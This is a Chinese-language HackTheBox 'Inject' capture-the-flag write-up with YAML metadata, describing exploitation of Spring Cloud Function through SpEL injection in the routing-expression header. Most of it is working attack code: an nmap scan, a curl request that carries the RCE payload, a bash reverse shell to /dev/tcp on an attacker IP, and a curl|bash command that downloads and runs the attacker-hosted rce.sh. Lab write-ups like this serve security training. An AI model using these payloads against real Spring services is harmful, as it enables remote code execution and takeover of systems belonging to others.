---
title: HackTheBox Inject WriteUp
contest: HackTheBox Inject
year: 2023
difficulty: medium
vuln_type: rce
tags: [htb, pentest, nmap, spring4shell, functionRouter, java-rce, el-injection, ngrok]
attack_chain:
  - nmap: 22/8080端口, Nagios NSCA
  - Spring Cloud Function RCE (Spring4Shell 变种)
  - curl POST /functionRouter
  - Header: spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(...)
  - EL1001E错误:ProcessImpl to String
  - 反弹shell: bash -i >& /dev/tcp/10.10.14.5/5555 0>&1
  - python3 -m http.server 80提供rce.sh
  - curl下载并执行
key_payload: spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("touch /tmp/pwned")
one_liner: HTB Inject：Spring Cloud Function RCE 反弹shell
lesson: Spring Cloud Function SpEL表达式注入RCE
quality: high
---

# HackTheBox Inject WriteUp

## 题目信息
- 平台：HackTheBox
- 题目：Inject
- 类别：Pentest 实战

## 关键攻击链
### 1. 端口扫描
```bash
sudo nmap -Pn -n -v --reason -sS -p- --min-rate=1000 -A 10.10.11.204 -oN nmap.log
# 22/tcp open ssh OpenSSH 8.2p1
# 8080/tcp open nagios-nsca
```

### 2. Spring Cloud Function RCE
```bash
curl -X POST http://10.10.11.204:8080/functionRouter \
  -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("touch /tmp/pwned")' \
  --data-raw 'data' -v
```

### 3. 错误响应
```
HTTP/1.1 500
{"timestamp":"2023-07-09T15:51:54.787+00:00","status":500,
 "error":"Internal Server Error",
 "message":"EL1001E: Type conversion problem, 
          cannot convert from java.lang.ProcessImpl to java.lang.String",
 "path":"/functionRouter"}
```

### 4. 反弹 shell
```bash
# rce.sh
bash -i >& /dev/tcp/10.10.14.5/5555 0>&1

# 启动 HTTP 服务
python3 -m http.server 80

# 远程下载执行
curl -X POST http://10.10.11.204:8080/functionRouter \
  -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl http://10.10.14.5/rce.sh|bash")' \
  --data-raw 'data'
```

## 评分
- quality: high（Spring Cloud Function RCE + SpEL 注入完整攻击链）
